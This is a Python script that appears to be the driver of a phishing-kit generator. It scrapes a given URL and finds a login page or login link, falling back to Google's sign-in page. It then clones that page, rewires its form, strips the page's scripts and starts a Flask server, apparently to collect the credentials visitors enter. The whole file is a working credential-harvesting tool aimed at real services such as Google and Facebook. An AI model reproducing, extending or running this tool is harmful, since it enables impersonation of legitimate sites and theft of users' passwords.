import os
import clone
import screenshot
import mainhtml
import requests
from bs4 import BeautifulSoup
from termcolor import colored
import implement_backend as backend
from urllib.parse import urlparse
import pickle
import subprocess



#Open Keyword files:
cwd = os.getcwd()
folder_path = cwd+ "\\" + "keywords"
link_var = []
input_mail=[]
input_pass=[]
with open(os.path.join(folder_path, "link_keywords"), 'r', encoding='utf-8') as file:
    for line in file:
        link_var.append(line.strip())
with open(os.path.join(folder_path, "mail_keywords"), 'r', encoding='utf-8') as file:
    for line in file:
        input_mail.append(line.strip())
with open(os.path.join(folder_path, "password_keywords"), 'r', encoding='utf-8') as file:
    for line in file:
        input_pass.append(line.strip())

#Linklists
links_with_text = []
check = []
login_link = []
uniquestrings = []
finallinks = []
url = input("pls enter a url: ")

#Scrape Page:
result = requests.get(url).text
doc = BeautifulSoup(result, "html.parser")
with open('output.html', 'w', encoding="utf-8") as file:
    file.write(str(doc))


#Functions
mainhtml.find_links(doc, links_with_text)
#check if input field
if(mainhtml.check_form(doc, input_mail, input_pass)):
        print(colored("Page identified as Loginpage!","blue"))
        clone.download_website(url)
        screenshot.take_screenshot(url, 'screenhot.png')
        backend.copy_files(urlparse(url).netloc, "index.html")
        backend.implement_form()
        inputlist =[]
        inputnames = []
        
        backend.delete_scripts()
        backend.get_vars_for_flask(inputlist, inputnames)
        with open('data.pkl', 'wb') as f:
            pickle.dump(inputnames, f)
            
        cwd = os.getcwd()
        python_file_path =os.path.join(cwd, 'flaskapp.py')
        subprocess.run(["python", python_file_path])
else:  
        mainhtml.check_links(links_with_text, link_var, login_link)
        mainhtml.find_links_title(doc, link_var, login_link)
        mainhtml.check_html(login_link, link_var)
        
        if(mainhtml.check_google_login()):
            print(colored("Google Login found", "green"))
            print("url: https://accounts.google.com/")
            clone.download_website("https://accounts.google.com/")
            #screenshot.take_screenshot("https://accounts.google.com/", 'screenhot.png')
            backend.copy_files("accounts.google.com", "index.html")
            backend.implement_form()
            inputlist =[]
            inputnames = []
            
            backend.get_vars_for_flask(inputlist, inputnames)
            with open('data.pkl', 'wb') as f:
                pickle.dump(inputnames, f)
            
            cwd = os.getcwd()
            python_file_path =os.path.join(cwd, 'flaskapp.py')
            subprocess.run(["python", python_file_path])
        elif len(login_link) > 0:
            print(colored("Loginlink found!", "green"))
            mainhtml.buildurl(login_link, url)
            mainhtml.sortlinks(login_link, uniquestrings)
            mainhtml.filter_links(uniquestrings, finallinks)
            
            link = 0
            if len(finallinks) > 0:
                link = finallinks
            else:
                link = uniquestrings
            print("found links:")
            print(colored(link,"yellow"))
            postion= int(input("which link you want to use? "))
            clone.download_website(link[postion-1])
            #screenshot.take_screenshot(link[postion-1], 'screenhot.png')
            backend.copy_files(urlparse(link[postion-1]).netloc, "index.html")
            backend.implement_form()
            inputlist =[]
            inputnames = []
            if url == "https://facebook.com":#facebook blocks pass input field
                backend.delete_scripts()
            backend.delete_scripts()
            backend.get_vars_for_flask(inputlist, inputnames)
            with open('data.pkl', 'wb') as f:
                pickle.dump(inputnames, f)
            
            cwd = os.getcwd()
            python_file_path =os.path.join(cwd, 'flaskapp.py')
            subprocess.run(["python", python_file_path])
            
        else:
            print(colored("No Loginlink found!", "red"))
#maincss.main(url)